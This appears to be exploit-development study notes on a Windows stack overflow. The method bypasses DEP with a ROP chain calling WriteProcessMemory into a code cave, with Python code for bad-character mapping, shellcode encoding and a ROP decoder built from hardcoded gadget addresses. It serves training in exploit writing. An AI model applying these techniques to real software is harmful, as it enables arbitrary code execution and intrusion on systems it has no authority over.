# Stack Layout When Crashing
```
 _____________________________ 
|  A * (offset-len(wpm)）     |    Lower Address
|_____________________________|    ↑
|  WPM Address                |    ↑
|_____________________________|    ↑
|  Return Address             |    ↑
|_____________________________|    ↑
|  hProcess argument          |    ↑
|_____________________________|    ↑
|  lpBaseAddress argument     |    ↑
|_____________________________|    ↑
|  lpBuffer argument          |    ↑
|_____________________________|    ↑
|  nSize argument             |    ↑
|_____________________________|    ↑
|  lpNumberOfBytesWritten arg |    ↑
|_____________________________|    ↑
|  Written EIP                |    ↑    
|  Gadget saves initial ESP   |    ↑    
|_____________________________|    ↑
|  B * gap (gap can be 0)     |    ↓ 
|_____________________________|    ↓
|  Start of ROP Chain         |    ↓
|  Initial ESP                |    ↓
|_____________________________|    ↓
|  ROP Chain ...              |    ↓
|_____________________________|    ↓    
|  Start of shellcode         |    ↓ 
|_____________________________|    ↓
|  The first bad character    |    ↓ 
|_____________________________|    ↓
|  ......                     |    ↓ 
|_____________________________|    ↓
|  The last bad character     |    ↓ 
|_____________________________|    Higher Address
```


# Steps
## Crash the application
Find the length of payload that is sufficient to crash the application

## Find the offset to overwrite EIP
Find the offset that can overwrite EIP
```bash
//Bash
msf-pattern_create -l <length>
msf-pattern_offset -l <length> -q <EIP>
```

## Find the offset from return address to ESP
When the application crashes, find the distance between the return address and ESP. Sometimes it is 0, sometimes it is not.
```windbg
//WinDBG
dd esp + <offset>
```

```bash
//Bash
msf-pattern_offset -l <length> -q <First DWORD of payload>
```
Pad the gap, and align valid payload with ESP.

## Find bad characters
Replace the actual payload with characters from 0x01 to 0xff. Find all the bad characters.

```python
# Python
  badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

The payload is ```A * length + B * gap + \x01\x02\x03\...\xff```

## Select a gadget that saves the initial ESP when crashing
Note the base address of an unprotected module
```windbg
//WinDBG
.load narly
!nmod
lm m <module>
```


Eliminate all bad characters, and run rp.exe or the script to collect gadgets.

Firstly, select a gadget that saves the initial ESP when crashing.

Some typical forms:

- push ESP, pop ANY
- push ESP, other instructions, pop ANY
- mov ANY, esp
- lea ANY, esp/[esp]
- lea ANY, [esp+offset]
- (When register1 meets specific requirements) add/sub/mul/or/xor ANY, esp 

## Overwrite EIP with the gadget that saves the initial ESP
Overwrite EIP with the gadget that saves the initial ESP, the initial ESP points to the start of ROP chain.

```python
# python
  eip = pack("<L", (0x10154112))
  padding = b"B"*<gap>
```

## Construct placeholder arguments required for calling WPM

```python
  va  = pack("<L", (0x45454545)) # dummy WPM Address or function IAT entry
  va += pack("<L", (<Code cave in .text section>) # Shellcode Return Address
  va += pack("<L", (0xffffffff)) # hProcess = 0xffffffff
  va += pack("<L", (<Code cave in .text section>) # lpBaseAddress
  va += pack("<L", (0x46464646)) # dummy lpBuffer
  va += pack("<L", (0xfffffdf0)) # placeholder nSize = 0x16e (-0x16e)
  va += pack("<L", (<An unused dword in .data section>)) # lpNumberOfBytesWritten 
```

WPM address can be a dummy address(Depending on usable gadgets), or function IAT entry

Shellcode return address and lpBaseBuffer store the address in .text section where the following hundreds of bytes are available

hProcess is set 0xffffffff, no need to patch

lpBuffer stores store placeholder values

nSize is set 0xfffffe92. Neg to recover the original value.

lpNumberOfBytesWritten is an unused dword in .data section, no need to patch.

## Locate code cave in .text section
Locate code cave in .text section to hold copied shellcode. It is located in the unused part of the last memory page of .text section.

```windbg
\\WinDBG
!dh -s <Base Address>
!address <Base Address> + <VA of .text section>
```

Select an address higher than ```<Base Address> + <VA of .text section> + <Virtual Size of .text section>```, and make sure the following hundreds of bytes are usable.

## Locate a usable DWORD in .data section
Locate .data section, which is ```<Base Address> + <VA of section .data>```

A usable dword can be the first dword after the end of actual data in .data section: ```<Base Address> + <VA of .data section> + <Virtual Size of .data section> + 4```

## Fetch IAT and address
If WPM is imported into the module, fetch the IAT

If WPM is not imported, find any function in KERNEL32, and calculate the offset between the 2 functions.

```windbg
\\WinDBG
x kernel32!<Function Imported>
x kernel32!WriteProcessMemoryStub
? <Address of WriteProcessMemoryStub> - <Address of Function Imported>
```

## Patch WPM address argument
The initial ESP points to the start of the ROP chain, it is 0x1c+gap bytes away from WPM address argument on the stack

## Patch lpBuffer argument
Increase the address by 0x10 bytes from WPM address argument to reach lpBuffer argument. Since we have not finished the ROP chain, so reserve a sufficient length for it. For instance, 0x49c bytes.

So, the shellcode is 0x49c bytes away from lpBuffer argument

## Patch nSize
Increase the address by 4 bytes, fetch and neg the value of nSize argument.

## Align start of shellcode
Because nSize is 4 bytes closer than shellcode, so decrease the offset by 4, for instance, 0x498.

## Map bad characters and encode shellcode
Considering the shellcode will be copied to .text section, because the shellcode decoding stub expects the code to be stored in writable memory, and .text section is not, therefore MSF's decoding will not work. We need to write our ROP encoder.

Firstly, encode the original shellcode by replacing bad characters, and get a list of positions/indexes of bad characters in the shellcode array.

```python
def mapBadChars(sh):
	BADCHARS = b"\x00\x0a\x0d\x25\x26\x2b\x3d"
	i = 0
	badIndex = []
	while i < len(sh):
		for c in BADCHARS:
			if sh[i] == c:
				badIndex.append(i)
		i=i+1
	print(badIndex)
	return badIndex

def encodeShellcode(sh):
	BADCHARS     = b"\x00\x0a\x0d\x25\x26\x2b\x3d"
	REPLACECHARS = b"\x02\x0c\x0f\x27\x28\x2d\x3f"	
	encodedShell = sh
	for i in range(len(BADCHARS)):
		encodedShell = encodedShell.replace(pack("B", BADCHARS[i]), pack("B", REPLACECHARS[i]))
	return encodedShell
```



## Decode Shellcode
Currently, bad characters are replaced by other characters, we can use simple add/sub operation to recover the original value.

Depending on usable gadgets, we can use add or sub operation to recover the original byte: ```REPLACECHARS[i] = BADCHARS[i] + CHARSTOSUB[i]``` or ```REPLACECHARS[i] = BADCHARS[i] -  CHARSTOSUB[i] ```

The offset between two replaced bytes is positive, neg it to ensure no \x00 byte: ```neg_offset = (-offset) & 0xffffffff```

Desired gadgets to decode replaced characters are as follows:

```asm
//Offset can be 0
add [<e-register>+offset], <h-register>; ret;
add [<e-register>+offset], <l-register>; ret;
sub [<e-register>+offset], <h-register>; ret;
sub [<e-register>+offset], <l-register>; ret;
```
If the value will be fetched from h-register, the value should be ```value = (value << 8) | 0x11110011```

If the value will be fetched from l-register, the value should be ```value = (-value) & 0xffffffff```

Ensure the same register to point to bad characters at the beginning and end of each loop. For instance, before entering the loop, register EDX points to nSize argument/bad character, at the end of the loop, EDX points to next character.

```python
def decodeShellcode(badIndex, shellcode):
# REPLACECHARS[i] = CHARSTOSUB[i] + BADCHARS[i]
#	REPLACECHARS = b"\x02\x0c\x0f\x27\x28\x2d\x3f"	
	BADCHARS     = b"\x00\x0a\x0d\x25\x26\x2b\x3d"
	CHARSTOSUB   = b"\x02\x02\x02\x02\x02\x02\x02"
	restoreRop = b""
	for i in range(len(badIndex)):
		if i == 0:
			offset = badIndex[i]
		else:
			offset = badIndex[i] - badIndex[i-1]
		neg_offset = (-offset) & 0xffffffff
		value = 0
		for j in range(len(BADCHARS)):
			if shellcode[badIndex[i]] == BADCHARS[j]:
				value = CHARSTOSUB[j]
		value = (-value) & 0xffffffff
	#	value = (value << 8) | 0x11110011
		# EDX points to nSize argument
		restoreRop += pack("<L",(0x1002f729))		# pop eax; ret;
		restoreRop += pack("<L", (neg_offset))		# EAX=-offset
		restoreRop += pack("<L",(0x1005a3e6))		# neg eax; ret;		//EAX = offset	
		restoreRop += pack("<L",(0x1003f9f9))		# add eax, edx; ret 0x004;	//EAX points to the i-th bad char from the (i-1)-th bad char
		restoreRop += pack("<L",(0x100cb4d4))		# xchg edx, eax; ret;		//EDX points to the i-th bad char
		restoreRop += pack("<L",(0x42424242))		# Junk for ret 0x004
		restoreRop += pack("<L",(0x1002f729))		# pop eax; ret;	 
		restoreRop += pack("<L", (value))               # The delta values in al
		restoreRop += pack("<L",(0x1005a3e6))		# neg eax; ret;		//al saves the value to sub
		restoreRop += pack("<L",(0x100baecb))		# xchg ecx, eax; ret;	//cl saves the value to sub
		restoreRop += pack("<L",(0x10104efd))		# push edx; or al, 0x5e; xor eax, eax; pop ebx; ret;	//EBX points to the i-th bad char
		restoreRop += pack("<L",(0x1004e992))		# sub [ebx], cl; ret;		//[EBX] is the encoded byte, cl is the chartosub value, then [EBX] is recovered shellcode byte
	return restoreRop
```
## Execute WPM
Now a register points to the last bad character. Calculate the offset, and move to WPM address argument. Align ESP with WPM address argument.

```windbg
\\WinDBG
dd <last bad char> l1
dd <last bad char> - <offset> l7
```

## Align Shellcode
Calculate the offset between the placeholder shellcode address and the actual shellcode address

```windbg
\\WinDBG
dd <Address of lpBuffer argument> l1 (Before calling WPM)
dd <Value of lpBuffer argument> + <offset>
```
